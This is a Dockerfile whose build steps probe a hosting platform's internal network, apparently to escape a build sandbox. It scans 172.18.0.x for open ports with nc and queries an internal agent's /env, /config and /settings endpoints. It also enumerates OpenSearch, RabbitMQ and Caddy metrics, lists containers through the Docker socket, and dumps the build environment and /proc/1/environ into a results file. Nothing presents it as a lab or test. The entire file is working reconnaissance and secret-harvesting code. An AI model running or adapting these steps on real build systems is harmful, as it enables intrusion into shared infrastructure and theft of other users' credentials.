FROM python:3-alpine
RUN apk add --no-cache curl iproute2 net-tools nmap-ncat

# === BUILD-PHASE: HOST NETWORK — FULL AGENT ACCESS ===
RUN echo "=== BUILD PHASE: build.network=host ===" > /build-results.txt

# Agent health
RUN echo "=== AGENT HEALTH ===" >> /build-results.txt
RUN curl -s -m 5 http://172.18.0.2:8000/health >> /build-results.txt 2>&1 || true

# Agent root
RUN echo "" >> /build-results.txt && echo "=== AGENT ROOT ===" >> /build-results.txt
RUN curl -s -m 5 http://172.18.0.2:8000/ >> /build-results.txt 2>&1 || true

# Agent OpenAPI
RUN echo "" >> /build-results.txt && echo "=== AGENT OPENAPI ===" >> /build-results.txt
RUN curl -s -m 5 http://172.18.0.2:8000/openapi.json >> /build-results.txt 2>&1 || true

# Agent docs
RUN echo "" >> /build-results.txt && echo "=== AGENT DOCS ===" >> /build-results.txt
RUN curl -s -m 5 http://172.18.0.2:8000/docs >> /build-results.txt 2>&1 || true

# Agent all common endpoints
RUN echo "" >> /build-results.txt && echo "=== AGENT ENDPOINTS ===" >> /build-results.txt
RUN for ep in /health /settings /config /env /status /info /metrics /app /deploy /webhooks; do \
  echo "--- $ep ---" >> /build-results.txt; \
  curl -s -m 3 http://172.18.0.2:8000$ep >> /build-results.txt 2>&1; \
  echo "" >> /build-results.txt; \
done

# Scan all agent-network containers
RUN echo "" >> /build-results.txt && echo "=== FULL AGENT-NETWORK SCAN ===" >> /build-results.txt
RUN for i in 1 2 3 4 5 6 7 8 9 10; do \
  for port in 80 443 2019 5672 8000 9090 9100 9200 15672 24224 27110; do \
    nc -z -w1 172.18.0.$i $port 2>/dev/null && echo "172.18.0.$i:$port OPEN" >> /build-results.txt; \
  done; \
done

# OpenSearch
RUN echo "" >> /build-results.txt && echo "=== OPENSEARCH ===" >> /build-results.txt
RUN for i in 2 3 4 5 6 7 8 9 10; do \
  RES=$(curl -s -m 2 -o /dev/null -w "%{http_code}" http://172.18.0.$i:9200/ 2>/dev/null); \
  if [ "$RES" != "000" ]; then \
    echo "ES at 172.18.0.$i:9200 → $RES" >> /build-results.txt; \
    curl -s -m 3 http://172.18.0.$i:9200/ >> /build-results.txt 2>&1; \
    echo "" >> /build-results.txt; \
  fi; \
done

# AMQP / RabbitMQ Management
RUN echo "" >> /build-results.txt && echo "=== RABBITMQ ===" >> /build-results.txt
RUN for i in 2 3 4 5 6 7 8 9 10; do \
  nc -z -w1 172.18.0.$i 5672 2>/dev/null && echo "AMQP at 172.18.0.$i" >> /build-results.txt; \
  RES=$(curl -s -m 2 -o /dev/null -w "%{http_code}" http://172.18.0.$i:15672/ 2>/dev/null); \
  if [ "$RES" != "000" ]; then \
    echo "RabbitMQ Mgmt at 172.18.0.$i:15672 → $RES" >> /build-results.txt; \
    curl -s -m 3 http://172.18.0.$i:15672/api/overview >> /build-results.txt 2>&1; \
    echo "" >> /build-results.txt; \
  fi; \
done

# Caddy internal
RUN echo "" >> /build-results.txt && echo "=== CADDY METRICS ===" >> /build-results.txt
RUN for i in 2 3 4 5 6 7 8 9 10; do \
  RES=$(curl -s -m 2 -o /dev/null -w "%{http_code}" http://172.18.0.$i:9090/metrics 2>/dev/null); \
  if [ "$RES" != "000" ]; then \
    echo "Caddy metrics at 172.18.0.$i:9090 → $RES" >> /build-results.txt; \
    curl -s -m 3 http://172.18.0.$i:9090/metrics >> /build-results.txt 2>&1 | head -30; \
    echo "" >> /build-results.txt; \
  fi; \
done

# Docker socket
RUN echo "" >> /build-results.txt && echo "=== DOCKER SOCKET ===" >> /build-results.txt
RUN curl -s -m 3 --unix-socket /var/run/docker.sock http://localhost/version >> /build-results.txt 2>&1 || true
RUN echo "" >> /build-results.txt
RUN curl -s -m 3 --unix-socket /var/run/docker.sock http://localhost/containers/json >> /build-results.txt 2>&1 || true

# Host env
RUN echo "" >> /build-results.txt && echo "=== BUILD ENV ===" >> /build-results.txt
RUN env >> /build-results.txt 2>&1 || true

# Proc
RUN echo "" >> /build-results.txt && echo "=== /proc/1/environ ===" >> /build-results.txt
RUN cat /proc/1/environ 2>&1 | tr '\0' '\n' >> /build-results.txt || true

WORKDIR /app
COPY probe.sh /app/
RUN chmod +x /app/probe.sh
EXPOSE 8080
CMD ["/app/probe.sh"]
